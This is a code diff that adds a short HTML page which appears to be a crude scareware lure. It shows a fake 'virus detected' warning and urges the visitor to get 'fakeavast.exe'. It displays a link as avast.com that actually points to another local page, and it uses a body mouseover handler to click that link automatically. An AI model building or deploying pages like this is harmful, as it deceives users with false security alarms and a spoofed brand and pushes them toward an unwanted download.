@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<body onmouseover="myFunction()">
+<img style = "width: 8%; ; " src="https://www.w3schools.com/images/stop.gif"  alt=""  />
+<h1> THERE IS A VIRUS DETECTED IN YOUR COMPUTER <h1/>
+<p> get fakeavast.exe to get rid of this virus <p>
+<a id="googleBtn" href="tt.html">avast.com<a />
+<script>
+setTimeout(openWin, 500);
+function openWin()
+{
+   //window.open("https://www.w3schools.com");
+//window.open("https://www.w3schools.com",'_blank');
+    //setTimeout(openWin, 500);
+
+
+
+// get refernce to the button
+const googleBtn = document.getElementById("googleBtn");
+
+// add click event handler to button
+googleBtn.addEventListener("click", () => {
+  //window.open("https://google.com");
+});
+
+//document.getElementById("googleBtn").click();
+
+}
+function myFunction()
+{
+document.getElementById("googleBtn").click();
+//window.open("https://google.com");
+}
+</script>
+
+</body>
+</html>
